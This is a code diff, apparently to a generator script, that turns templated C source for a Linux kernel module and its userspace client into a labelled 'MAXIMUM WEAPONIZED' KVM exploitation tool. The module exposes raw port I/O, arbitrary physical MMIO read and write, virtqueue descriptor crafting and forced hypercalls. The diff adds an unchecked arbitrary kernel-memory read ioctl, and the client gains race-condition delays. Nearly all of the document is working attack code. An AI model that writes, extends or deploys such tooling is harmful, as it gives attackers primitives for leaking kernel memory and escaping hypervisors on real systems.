@@ -134,13 +134,12 @@ def setup_kvm_probe_lab():
 #include <linux/types.h>
 #include <linux/byteorder/generic.h>
 #include <linux/kvm_para.h>
-#define DRIVER_NAME "{{MODULE_NAME}}"
-#define DEVICE_FILE_NAME "{{DEVICE_NAME}}"
+
+#define DRIVER_NAME "kvm_probe_drv"
+#define DEVICE_FILE_NAME "kvm_probe_dev"
 
 #define VQ_PAGE_ORDER 0
 #define VQ_PAGE_SIZE (1UL << (PAGE_SHIFT + VQ_PAGE_ORDER))
-
-// Increase virtqueue page size for better exploitability
 #define MAX_VQ_DESCS 256
 
 static void *g_vq_virt_addr = NULL;
@@ -175,30 +174,39 @@ struct vq_desc_user_data {{
     u16 next_idx;
 }};
 
-#define IOCTL_READ_PORT {IOCTL_READ_PORT_DEF}
-#define IOCTL_WRITE_PORT {IOCTL_WRITE_PORT_DEF}
-#define IOCTL_READ_MMIO {IOCTL_READ_MMIO_DEF}
-#define IOCTL_WRITE_MMIO {IOCTL_WRITE_MMIO_DEF}
-#define IOCTL_ALLOC_VQ_PAGE {IOCTL_ALLOC_VQ_PAGE_DEF}
-#define IOCTL_FREE_VQ_PAGE  {IOCTL_FREE_VQ_PAGE_DEF}
-#define IOCTL_WRITE_VQ_DESC {IOCTL_WRITE_VQ_DESC_DEF}
-#define IOCTL_TRIGGER_HYPERCALL {IOCTL_TRIGGER_HYPERCALL_DEF}
+/* === ADDED: KERNEL ARBITRARY READ === */
+struct kvm_kernel_mem_read {{
+    unsigned long kernel_addr;
+    unsigned long length;
+    unsigned char __user *user_buf;
+}};
+
+#define IOCTL_READ_PORT        0x1001
+#define IOCTL_WRITE_PORT       0x1002
+#define IOCTL_READ_MMIO        0x1003
+#define IOCTL_WRITE_MMIO       0x1004
+#define IOCTL_ALLOC_VQ_PAGE    0x1005
+#define IOCTL_FREE_VQ_PAGE     0x1006
+#define IOCTL_WRITE_VQ_DESC    0x1007
+#define IOCTL_TRIGGER_HYPERCALL 0x1008
+#define IOCTL_READ_KERNEL_MEM  0x1009  /* <--- ADD: ARB KERNEL MEM READ */
+
+/* ========== */
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("KVM Probe Lab");
-MODULE_DESCRIPTION("Enhanced kernel module for KVM exploitation");
+MODULE_AUTHOR("KVM Probe Lab x Uncle Nickypoo x ChatGPT");
+MODULE_DESCRIPTION("MAXIMUM WEAPONIZED kernel module for KVM exploitation");
 
 static int major_num;
 static struct class* driver_class = NULL;
 static struct device* driver_device = NULL;
 
-// Hypercall helper with timing info
 static long force_hypercall(void) {{
     long ret;
     u64 start = ktime_get_ns();
     ret = kvm_hypercall0(KVM_HC_VAPIC_POLL_IRQ);
     u64 end = ktime_get_ns();
-    printk(KERN_INFO "%s: HYPERCALL executed | latency=%llu ns | ret=%ld\\n",
+    printk(KERN_INFO "%s: HYPERCALL executed | latency=%llu ns | ret=%ld\n",
            DRIVER_NAME, end - start, ret);
     return ret;
 }}
@@ -210,21 +218,21 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
     unsigned long len_to_copy;
     unsigned char *k_mmio_buffer = NULL;
 
-    printk(KERN_CRIT "%s: IOCTL ENTRY! cmd=0x%x, arg=0x%lx. ktime=%llu\\n",
+    printk(KERN_CRIT "%s: IOCTL ENTRY! cmd=0x%x, arg=0x%lx. ktime=%llu\n",
            DRIVER_NAME, cmd, arg, ktime_get_ns());
 
     switch (cmd) {{
         case IOCTL_READ_PORT:
         {{
             if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {{
-                printk(KERN_ERR "%s: READ_PORT: copy_from_user failed. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+                printk(KERN_ERR "%s: READ_PORT: copy_from_user failed. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
                 return -EFAULT;
             }}
-            printk(KERN_INFO "%s: IOCTL_READ_PORT: port=0x%hx, req_size=%u. ktime=%llu\\n",
+            printk(KERN_INFO "%s: IOCTL_READ_PORT: port=0x%hx, req_size=%u. ktime=%llu\n",
                    DRIVER_NAME, p_io_data_kernel.port, p_io_data_kernel.size, ktime_get_ns());
 
             if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4) {{
-                printk(KERN_WARNING "%s: READ_PORT: Invalid size: %u. ktime=%llu\\n", DRIVER_NAME, p_io_data_kernel.size, ktime_get_ns());
+                printk(KERN_WARNING "%s: READ_PORT: Invalid size: %u. ktime=%llu\n", DRIVER_NAME, p_io_data_kernel.size, ktime_get_ns());
                 return -EINVAL;
             }}
 
@@ -233,29 +241,27 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
                 case 2: p_io_data_kernel.value = inw(p_io_data_kernel.port); break;
                 case 4: p_io_data_kernel.value = inl(p_io_data_kernel.port); break;
             }}
-            printk(KERN_INFO "%s: IOCTL_READ_PORT: value_read=0x%x from port 0x%hx. ktime=%llu\\n",
+            printk(KERN_INFO "%s: IOCTL_READ_PORT: value_read=0x%x from port 0x%hx. ktime=%llu\n",
                    DRIVER_NAME, p_io_data_kernel.value, p_io_data_kernel.port, ktime_get_ns());
 
             if (copy_to_user((struct port_io_data __user *)arg, &p_io_data_kernel, sizeof(p_io_data_kernel))) {{
-                printk(KERN_ERR "%s: READ_PORT: copy_to_user failed. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+                printk(KERN_ERR "%s: READ_PORT: copy_to_user failed. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
                 return -EFAULT;
             }}
-
-            // Force hypercall after operation
             force_hypercall();
             break;
         }}
         case IOCTL_WRITE_PORT:
         {{
             if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {{
-                printk(KERN_ERR "%s: WRITE_PORT: copy_from_user failed. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+                printk(KERN_ERR "%s: WRITE_PORT: copy_from_user failed. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
                 return -EFAULT;
             }}
-            printk(KERN_INFO "%s: IOCTL_WRITE_PORT: port=0x%hx, value_to_write=0x%x, req_size=%u. ktime=%llu\\n",
+            printk(KERN_INFO "%s: IOCTL_WRITE_PORT: port=0x%hx, value_to_write=0x%x, req_size=%u. ktime=%llu\n",
                    DRIVER_NAME, p_io_data_kernel.port, p_io_data_kernel.value, p_io_data_kernel.size, ktime_get_ns());
 
             if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4) {{
-                printk(KERN_WARNING "%s: WRITE_PORT: Invalid size: %u. ktime=%llu\\n", DRIVER_NAME, p_io_data_kernel.size, ktime_get_ns());
+                printk(KERN_WARNING "%s: WRITE_PORT: Invalid size: %u. ktime=%llu\n", DRIVER_NAME, p_io_data_kernel.size, ktime_get_ns());
                 return -EINVAL;
             }}
 
@@ -264,21 +270,26 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
                 case 2: outw((u16)p_io_data_kernel.value, p_io_data_kernel.port); break;
                 case 4: outl((u32)p_io_data_kernel.value, p_io_data_kernel.port); break;
             }}
-            printk(KERN_INFO "%s: IOCTL_WRITE_PORT: Write to port 0x%hx completed. ktime=%llu\\n",
+            printk(KERN_INFO "%s: IOCTL_WRITE_PORT: Write to port 0x%hx completed. ktime=%llu\n",
                    DRIVER_NAME, p_io_data_kernel.port, ktime_get_ns());
 
-            // Force hypercall after operation
             force_hypercall();
             break;
         }}
         case IOCTL_READ_MMIO:
         {{
             struct mmio_data data;
-            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
+            if (copy_from_user(&data, (void __user *)arg, sizeof(data))) {{
+                printk(KERN_ERR "%s: IOCTL_READ_MMIO: copy_from_user failed\n", DRIVER_NAME);
                 return -EFAULT;
+            }}
+            printk(KERN_INFO "%s: IOCTL_READ_MMIO: Reading phys_addr=0x%lx, size=0x%lx, user_buffer=%px\n",
+                   DRIVER_NAME, data.phys_addr, data.size, data.user_buffer);
             void __iomem *mmio = ioremap(data.phys_addr, data.size);
-            if (!mmio)
+            if (!mmio) {{
+                printk(KERN_ERR "%s: IOCTL_READ_MMIO: ioremap failed\n", DRIVER_NAME);
                 return -EFAULT;
+            }}
             void *kbuf = kmalloc(data.size, GFP_KERNEL);
             if (!kbuf) {{
                 iounmap(mmio);
@@ -290,31 +301,33 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
                 iounmap(mmio);
                 return -EFAULT;
             }}
+            printk(KERN_INFO "%s: IOCTL_READ_MMIO: Read %lu bytes from 0x%lx OK\n", DRIVER_NAME, data.size, data.phys_addr);
             kfree(kbuf);
             iounmap(mmio);
+            force_hypercall();
             return 0;
         }}
         case IOCTL_WRITE_MMIO:
         {{
-            if (copy_from_user(&m_io_data_kernel, (struct mmio_data __user *)arg, sizeof(m_io_data_kernel))) {{ return -EFAULT; }}
+            if (copy_from_user(&m_io_data_kernel, (struct mmio_data __user *)arg, sizeof(m_io_data_kernel))) {{
+                printk(KERN_ERR "%s: IOCTL_WRITE_MMIO: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }}
             unsigned long map_size = m_io_data_kernel.size > 0 ? m_io_data_kernel.size : m_io_data_kernel.value_size;
             if (map_size == 0) {{
-                printk(KERN_ERR "%s: WRITE_MMIO: Map size is zero.\\n", DRIVER_NAME);
+                printk(KERN_ERR "%s: IOCTL_WRITE_MMIO: Map size is zero\n", DRIVER_NAME);
                 return -EINVAL;
             }}
-            printk(KERN_INFO "%s: WRITE_MMIO: Requesting ioremap for phys_addr=0x%lx, map_size=%lu\\n",
-                   DRIVER_NAME, m_io_data_kernel.phys_addr, map_size);
+            printk(KERN_INFO "%s: IOCTL_WRITE_MMIO: Writing phys_addr=0x%lx, map_size=%lu, user_buffer=%px\n",
+                   DRIVER_NAME, m_io_data_kernel.phys_addr, map_size, m_io_data_kernel.user_buffer);
             mapped_addr = ioremap(m_io_data_kernel.phys_addr, map_size);
             if (!mapped_addr) {{
-                printk(KERN_ERR "%s: WRITE_MMIO: ioremap for 0x%lx returned NULL!\\n",
-                       DRIVER_NAME, m_io_data_kernel.phys_addr);
+                printk(KERN_ERR "%s: IOCTL_WRITE_MMIO: ioremap failed\n", DRIVER_NAME);
                 return -ENOMEM;
             }}
-            printk(KERN_INFO "%s: WRITE_MMIO: ioremap(0x%lx, %lu) successful, mapped_addr=%p\\n",
-                   DRIVER_NAME, m_io_data_kernel.phys_addr, map_size, mapped_addr);
             if (m_io_data_kernel.size > 0) {{
                 if (!m_io_data_kernel.user_buffer) {{
-                    printk(KERN_ERR "%s: WRITE_MMIO: User buffer NULL.\\n", DRIVER_NAME);
+                    printk(KERN_ERR "%s: IOCTL_WRITE_MMIO: User buffer NULL\n", DRIVER_NAME);
                     iounmap(mapped_addr);
                     return -EFAULT;
                 }}
@@ -331,6 +344,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
                 for (len_to_copy = 0; len_to_copy < m_io_data_kernel.size; ++len_to_copy) {{
                     writeb(k_mmio_buffer[len_to_copy], mapped_addr + len_to_copy);
                 }}
+                printk(KERN_INFO "%s: IOCTL_WRITE_MMIO: Wrote %lu bytes to 0x%lx OK\n", DRIVER_NAME, m_io_data_kernel.size, m_io_data_kernel.phys_addr);
                 kfree(k_mmio_buffer);
             }} else {{
                 switch(m_io_data_kernel.value_size) {{
@@ -347,25 +361,51 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
                         writeq(m_io_data_kernel.single_value, mapped_addr);
                         break;
                     default:
-                        printk(KERN_ERR "%s: WRITE_MMIO: Invalid value_size %u\\n",
+                        printk(KERN_ERR "%s: IOCTL_WRITE_MMIO: Invalid value_size %u\n",
                                DRIVER_NAME, m_io_data_kernel.value_size);
                         iounmap(mapped_addr);
                         return -EINVAL;
                 }}
+                printk(KERN_INFO "%s: IOCTL_WRITE_MMIO: Wrote %u bytes to 0x%lx OK\n", DRIVER_NAME, m_io_data_kernel.value_size, m_io_data_kernel.phys_addr);
             }}
             iounmap(mapped_addr);
+            force_hypercall();
+            return 0;
+        }}
 
-            // Force hypercall after operation
+        /* === HERE'S YOUR WEAPONIZED ARB KERNEL READ === */
+        case IOCTL_READ_KERNEL_MEM:
+        {{
+            struct kvm_kernel_mem_read req;
+            if (copy_from_user(&req, (struct kvm_kernel_mem_read __user *)arg, sizeof(req))) {{
+                printk(KERN_ERR "%s: READ_KERNEL_MEM: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }}
+            printk(KERN_CRIT "%s: READ_KERNEL_MEM: kernel_addr=0x%lx, len=0x%lx, buf=%px\n",
+                DRIVER_NAME, req.kernel_addr, req.length, req.user_buf);
+
+            if (!req.kernel_addr || !req.length || !req.user_buf) {{
+                printk(KERN_ERR "%s: READ_KERNEL_MEM: Null arg\n", DRIVER_NAME);
+                return -EINVAL;
+            }}
+
+            // WARNING: This can crash kernel if you give invalid pointer
+            if (copy_to_user(req.user_buf, (void *)req.kernel_addr, req.length)) {{
+                printk(KERN_ERR "%s: READ_KERNEL_MEM: copy_to_user failed for kernel_addr=0x%lx\n", DRIVER_NAME, req.kernel_addr);
+                return -EFAULT;
+            }}
+            printk(KERN_CRIT "%s: READ_KERNEL_MEM: read OK for 0x%lx\n", DRIVER_NAME, req.kernel_addr);
             force_hypercall();
             break;
         }}
+
         case IOCTL_ALLOC_VQ_PAGE:
         {{
             struct page *vq_page_ptr;
             unsigned long pfn_to_user;
 
             if (g_vq_virt_addr) {{
-                printk(KERN_INFO "%s: ALLOC_VQ_PAGE: Freeing previous VQ page (virt: %p, phys: 0x%llx). ktime=%llu\\n",
+                printk(KERN_INFO "%s: ALLOC_VQ_PAGE: Freeing previous VQ page (virt: %p, phys: 0x%llx). ktime=%llu\n",
                        DRIVER_NAME, g_vq_virt_addr, (unsigned long long)g_vq_phys_addr, ktime_get_ns());
                 free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                 g_vq_virt_addr = NULL;
@@ -374,7 +414,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
             }}
             vq_page_ptr = alloc_pages(GFP_KERNEL | __GFP_ZERO | __GFP_HIGHMEM, VQ_PAGE_ORDER);
             if (!vq_page_ptr) {{
-                printk(KERN_ERR "%s: ALLOC_VQ_PAGE: Failed to allocate VQ page. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+                printk(KERN_ERR "%s: ALLOC_VQ_PAGE: Failed to allocate VQ page. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
                 return -ENOMEM;
             }}
             g_vq_virt_addr = page_address(vq_page_ptr);
@@ -382,37 +422,33 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
             g_vq_pfn = PFN_DOWN(g_vq_phys_addr);
             pfn_to_user = g_vq_pfn;
 
-            printk(KERN_INFO "%s: ALLOC_VQ_PAGE: Allocated VQ page: virt=%p, phys=0x%llx, pfn=0x%lx, size=%lu. ktime=%llu\\n",
+            printk(KERN_INFO "%s: ALLOC_VQ_PAGE: Allocated VQ page: virt=%p, phys=0x%llx, pfn=0x%lx, size=%lu. ktime=%llu\n",
                    DRIVER_NAME, g_vq_virt_addr, (unsigned long long)g_vq_phys_addr, g_vq_pfn, VQ_PAGE_SIZE, ktime_get_ns());
 
             if (copy_to_user((unsigned long __user *)arg, &pfn_to_user, sizeof(pfn_to_user))) {{
-                printk(KERN_ERR "%s: ALLOC_VQ_PAGE: copy_to_user failed for PFN. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+                printk(KERN_ERR "%s: ALLOC_VQ_PAGE: copy_to_user failed for PFN. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
                 free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                 g_vq_virt_addr = NULL;
                 g_vq_phys_addr = 0;
                 g_vq_pfn = 0;
                 return -EFAULT;
             }}
-
-            // Force hypercall after operation
             force_hypercall();
             break;
         }}
         case IOCTL_FREE_VQ_PAGE:
         {{
-            printk(KERN_INFO "%s: IOCTL_FREE_VQ_PAGE. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+            printk(KERN_INFO "%s: IOCTL_FREE_VQ_PAGE. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
             if (g_vq_virt_addr) {{
-                printk(KERN_INFO "%s: FREE_VQ_PAGE: Freeing VQ page (virt: %p, phys: 0x%llx). ktime=%llu\\n",
+                printk(KERN_INFO "%s: FREE_VQ_PAGE: Freeing VQ page (virt: %p, phys: 0x%llx). ktime=%llu\n",
                        DRIVER_NAME, g_vq_virt_addr, (unsigned long long)g_vq_phys_addr, ktime_get_ns());
                 free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                 g_vq_virt_addr = NULL;
                 g_vq_phys_addr = 0;
                 g_vq_pfn = 0;
             }} else {{
-                printk(KERN_INFO "%s: FREE_VQ_PAGE: No VQ page currently allocated. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+                printk(KERN_INFO "%s: FREE_VQ_PAGE: No VQ page currently allocated. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
             }}
-
-            // Force hypercall after operation
             force_hypercall();
             break;
         }}
@@ -422,49 +458,44 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
             struct vring_desc_kernel *kernel_desc_ptr_local;
             unsigned int max_descs_in_page_local;
 
-            printk(KERN_INFO "%s: IOCTL_WRITE_VQ_DESC received. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+            printk(KERN_INFO "%s: IOCTL_WRITE_VQ_DESC received. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
             if (!g_vq_virt_addr) {{
-                printk(KERN_ERR "%s: WRITE_VQ_DESC: VQ page not allocated. Call ALLOC_VQ_PAGE first.\\n", DRIVER_NAME);
+                printk(KERN_ERR "%s: WRITE_VQ_DESC: VQ page not allocated. Call ALLOC_VQ_PAGE first.\n", DRIVER_NAME);
                 return -ENXIO;
             }}
             if (copy_from_user(&user_desc_data_kernel, (struct vq_desc_user_data __user *)arg, sizeof(user_desc_data_kernel))) {{
                 return -EFAULT;
             }}
-
             max_descs_in_page_local = VQ_PAGE_SIZE / sizeof(struct vring_desc_kernel);
             if (user_desc_data_kernel.index >= max_descs_in_page_local) {{
-                printk(KERN_ERR "%s: WRITE_VQ_DESC: Descriptor index %u out of bounds (max %u)\\n",
+                printk(KERN_ERR "%s: WRITE_VQ_DESC: Descriptor index %u out of bounds (max %u)\n",
                     DRIVER_NAME, user_desc_data_kernel.index, max_descs_in_page_local - 1);
                 return -EINVAL;
             }}
-
             kernel_desc_ptr_local = (struct vring_desc_kernel *)g_vq_virt_addr + user_desc_data_kernel.index;
-
             kernel_desc_ptr_local->addr = cpu_to_le64(user_desc_data_kernel.phys_addr);
             kernel_desc_ptr_local->len = cpu_to_le32(user_desc_data_kernel.len);
             kernel_desc_ptr_local->flags = cpu_to_le16(user_desc_data_kernel.flags);
             kernel_desc_ptr_local->next = cpu_to_le16(user_desc_data_kernel.next_idx);
 
-            printk(KERN_INFO "%s: Wrote VQ desc at index %u: GPA=0x%llx, len=%u, flags=0x%hx, next=%hu. ktime=%llu\\n",
+            printk(KERN_INFO "%s: Wrote VQ desc at index %u: GPA=0x%llx, len=%u, flags=0x%hx, next=%hu. ktime=%llu\n",
                    DRIVER_NAME, user_desc_data_kernel.index, user_desc_data_kernel.phys_addr,
                    user_desc_data_kernel.len, user_desc_data_kernel.flags, user_desc_data_kernel.next_idx, ktime_get_ns());
-
-            // Force hypercall after operation
             force_hypercall();
             break;
         }}
         case IOCTL_TRIGGER_HYPERCALL:
         {{
-            printk(KERN_INFO "%s: DIRECT HYPERCALL TRIGGER. ktime=%llu\\n", DRIVER_NAME, ktime_get_ns());
+            printk(KERN_INFO "%s: DIRECT HYPERCALL TRIGGER. ktime=%llu\n", DRIVER_NAME, ktime_get_ns());
             long ret = force_hypercall();
             if (copy_to_user((long __user *)arg, &ret, sizeof(ret))) {{
-                printk(KERN_ERR "%s: TRIGGER_HYPERCALL: copy_to_user failed\\n", DRIVER_NAME);
+                printk(KERN_ERR "%s: TRIGGER_HYPERCALL: copy_to_user failed\n", DRIVER_NAME);
                 return -EFAULT;
             }}
             break;
         }}
         default:
-            printk(KERN_ERR "%s: Unknown IOCTL command: 0x%x\\n", DRIVER_NAME, cmd);
+            printk(KERN_ERR "%s: Unknown IOCTL command: 0x%x\n", DRIVER_NAME, cmd);
             return -EINVAL;
     }}
     return 0;
@@ -475,38 +506,36 @@ static struct file_operations fops = {{
 }};
 
 static int __init mod_init(void) {{
-    printk(KERN_INFO "%s: Initializing Enhanced KVM Probe Module.\\n", DRIVER_NAME);
+    printk(KERN_INFO "%s: Initializing Enhanced KVM Probe Module.\n", DRIVER_NAME);
     major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
     if (major_num < 0) {{
-        printk(KERN_ERR "%s: register_chrdev failed: %d\\n", DRIVER_NAME, major_num);
+        printk(KERN_ERR "%s: register_chrdev failed: %d\n", DRIVER_NAME, major_num);
         return major_num;
     }}
-
     driver_class = class_create(THIS_MODULE, DRIVER_NAME);
     if (IS_ERR(driver_class)) {{
         unregister_chrdev(major_num, DEVICE_FILE_NAME);
-        printk(KERN_ERR "%s: class_create failed\\n", DRIVER_NAME);
+        printk(KERN_ERR "%s: class_create failed\n", DRIVER_NAME);
         return PTR_ERR(driver_class);
     }}
-
     driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
     if (IS_ERR(driver_device)) {{
         class_destroy(driver_class);
         unregister_chrdev(major_num, DEVICE_FILE_NAME);
-        printk(KERN_ERR "%s: device_create failed\\n", DRIVER_NAME);
+        printk(KERN_ERR "%s: device_create failed\n", DRIVER_NAME);
         return PTR_ERR(driver_device);
     }}
     g_vq_virt_addr = NULL;
     g_vq_phys_addr = 0;
     g_vq_pfn = 0;
-    printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d.\\n", DRIVER_NAME, DEVICE_FILE_NAME, major_num);
+    printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d.\n", DRIVER_NAME, DEVICE_FILE_NAME, major_num);
     return 0;
 }}
 
 static void __exit mod_exit(void) {{
-    printk(KERN_INFO "%s: Unloading KVM Probe Module.\\n", DRIVER_NAME);
+    printk(KERN_INFO "%s: Unloading KVM Probe Module.\n", DRIVER_NAME);
     if (g_vq_virt_addr) {{
-        printk(KERN_INFO "%s: mod_exit: Freeing VQ page (virt: %p, phys: 0x%llx).\\n",
+        printk(KERN_INFO "%s: mod_exit: Freeing VQ page (virt: %p, phys: 0x%llx).\n",
                DRIVER_NAME, g_vq_virt_addr, (unsigned long long)g_vq_phys_addr);
         free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
         g_vq_virt_addr = NULL;
@@ -523,7 +552,7 @@ static void __exit mod_exit(void) {{
     if (major_num >= 0) {{
         unregister_chrdev(major_num, DEVICE_FILE_NAME);
     }}
-    printk(KERN_INFO "%s: Module unloaded.\\n", DRIVER_NAME);
+    printk(KERN_INFO "%s: Module unloaded.\n", DRIVER_NAME);
 }}
 
 module_init(mod_init);
@@ -540,11 +569,11 @@ module_exit(mod_exit);
 #include <sys/ioctl.h>
 #include <errno.h>
 #include <inttypes.h>
-#include <time.h>  // For nanosleep
+#include <time.h>
 
-#define DEVICE_PATH "/dev/{{DEVICE_NAME}}"
+#define DEVICE_PATH "/dev/kvm_probe_dev"
 
-// Data structures (must match kernel module)
+// --- Structs (must match kernel) ---
 struct port_io_data {{
     unsigned short port;
     unsigned int size;
@@ -567,17 +596,23 @@ struct vq_desc_user_data {{
     unsigned short next_idx;
 }};
 
-// IOCTL definitions
-#define IOCTL_READ_PORT {IOCTL_READ_PORT_DEF}
-#define IOCTL_WRITE_PORT {IOCTL_WRITE_PORT_DEF}
-#define IOCTL_READ_MMIO {IOCTL_READ_MMIO_DEF}
-#define IOCTL_WRITE_MMIO {IOCTL_WRITE_MMIO_DEF}
-#define IOCTL_ALLOC_VQ_PAGE {IOCTL_ALLOC_VQ_PAGE_DEF}
-#define IOCTL_FREE_VQ_PAGE  {IOCTL_FREE_VQ_PAGE_DEF}
-#define IOCTL_WRITE_VQ_DESC {IOCTL_WRITE_VQ_DESC_DEF}
-#define IOCTL_TRIGGER_HYPERCALL {IOCTL_TRIGGER_HYPERCALL_DEF}
+struct kvm_kernel_mem_read {{
+    unsigned long kernel_addr;
+    unsigned long length;
+    unsigned char *user_buf;
+}};
 
-// Exploit helper functions
+// --- IOCTLs (MUST match your kernel) ---
+#define IOCTL_READ_PORT          0x1001
+#define IOCTL_WRITE_PORT         0x1002
+#define IOCTL_READ_MMIO          0x1003
+#define IOCTL_WRITE_MMIO         0x1004
+#define IOCTL_ALLOC_VQ_PAGE      0x1005
+#define IOCTL_FREE_VQ_PAGE       0x1006
+#define IOCTL_WRITE_VQ_DESC      0x1007
+#define IOCTL_TRIGGER_HYPERCALL  0x1008
+#define IOCTL_READ_KERNEL_MEM    0x1009
+
 void exploit_delay(int nanoseconds) {{
     struct timespec req = {{0}};
     req.tv_nsec = nanoseconds;
@@ -585,26 +620,27 @@ void exploit_delay(int nanoseconds) {{
 }}
 
 void print_usage(char *prog_name) {{
-    fprintf(stderr, "Usage: %s <command> [args...]\\n", prog_name);
-    fprintf(stderr, "Commands:\\n");
-    fprintf(stderr, "  readport <port_hex> <size_bytes (1,2,4)>\\n");
-    fprintf(stderr, "  writeport <port_hex> <value_hex> <size_bytes (1,2,4)>\\n");
-    fprintf(stderr, "  readmmio_val <phys_addr_hex> <size_bytes (1,2,4,8)> \\n");
-    fprintf(stderr, "  writemmio_val <phys_addr_hex> <value_hex> <size_bytes (1,2,4,8)> \\n");
-    fprintf(stderr, "  readmmio_buf <phys_addr_hex> <num_bytes_to_read> \\n");
-    fprintf(stderr, "  writemmio_buf <phys_addr_hex> <hex_string_to_write> \\n");
-    fprintf(stderr, "  allocvqpage                       (Allocate a page for VQ, prints PFN)\\n");
-    fprintf(stderr, "  freevqpage                        (Free the allocated VQ page)\\n");
-    fprintf(stderr, "  writevqdesc <idx> <buf_gpa_hex> <buf_len_str> <flags_hex> <next_idx_dec>\\n");
-    fprintf(stderr, "  trigger_hypercall                 (Directly trigger hypercall)\\n");
-    fprintf(stderr, "  exploit_delay <nanoseconds>       (Inject delay for race conditions)\\n");
-    fprintf(stderr, "  scanmmio <start_addr_hex> <end_addr_hex> <step_bytes>\\n");
+    fprintf(stderr, "Usage: %s <command> [args...]\n", prog_name);
+    fprintf(stderr, "Commands:\n");
+    fprintf(stderr, "  readport <port_hex> <size_bytes (1,2,4)>\n");
+    fprintf(stderr, "  writeport <port_hex> <value_hex> <size_bytes (1,2,4)>\n");
+    fprintf(stderr, "  readmmio_val <phys_addr_hex> <size_bytes (1,2,4,8)>\n");
+    fprintf(stderr, "  writemmio_val <phys_addr_hex> <value_hex> <size_bytes (1,2,4,8)>\n");
+    fprintf(stderr, "  readmmio_buf <phys_addr_hex> <num_bytes_to_read>\n");
+    fprintf(stderr, "  writemmio_buf <phys_addr_hex> <hex_string_to_write>\n");
+    fprintf(stderr, "  allocvqpage\n");
+    fprintf(stderr, "  freevqpage\n");
+    fprintf(stderr, "  writevqdesc <idx> <buf_gpa_hex> <buf_len> <flags_hex> <next_idx>\n");
+    fprintf(stderr, "  trigger_hypercall\n");
+    fprintf(stderr, "  exploit_delay <nanoseconds>\n");
+    fprintf(stderr, "  scanmmio <start_addr_hex> <end_addr_hex> <step_bytes>\n");
+    fprintf(stderr, "  readkvmem <kaddr_hex> <num_bytes>\n");
 }}
 
 unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {{
     size_t len = strlen(hex_str);
     if (len % 2 != 0) {{
-        fprintf(stderr, "Hex string must have an even number of characters.\\n");
+        fprintf(stderr, "Hex string must have an even number of characters.\n");
         return NULL;
     }}
     *num_bytes = len / 2;
@@ -615,7 +651,7 @@ unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes
     }}
     for (size_t i = 0; i < *num_bytes; ++i) {{
         if (sscanf(hex_str + 2 * i, "%2hhx", &bytes[i]) != 1) {{
-            fprintf(stderr, "Invalid hex char in string.\\n");
+            fprintf(stderr, "Invalid hex char in string.\n");
             free(bytes);
             return NULL;
         }}
@@ -641,7 +677,8 @@ int main(int argc, char *argv[]) {{
         data.port = (unsigned short)strtoul(argv[2], NULL, 16);
         data.size = (unsigned int)strtoul(argv[3], NULL, 10);
         if (ioctl(fd, IOCTL_READ_PORT, &data) < 0) perror("ioctl READ_PORT failed");
-        else printf("Port 0x%X (size %u) Value: 0x%X (%u)\\n", data.port, data.size, data.value, data.value);
+        else printf("Port 0x%X (size %u) Value: 0x%X (%u)\n", data.port, data.size, data.value, data.value);
+
     }} else if (strcmp(cmd, "writeport") == 0) {{
         if (argc != 5) {{ print_usage(argv[0]); close(fd); return 1; }}
         struct port_io_data data;
@@ -649,7 +686,8 @@ int main(int argc, char *argv[]) {{
         data.value = (unsigned int)strtoul(argv[3], NULL, 16);
         data.size = (unsigned int)strtoul(argv[4], NULL, 10);
         if (ioctl(fd, IOCTL_WRITE_PORT, &data) < 0) perror("ioctl WRITE_PORT failed");
-        else printf("Wrote 0x%X to port 0x%X (size %u)\\n", data.value, data.port, data.size);
+        else printf("Wrote 0x%X to port 0x%X (size %u)\n", data.value, data.port, data.size);
+
     }} else if (strcmp(cmd, "readmmio_val") == 0) {{
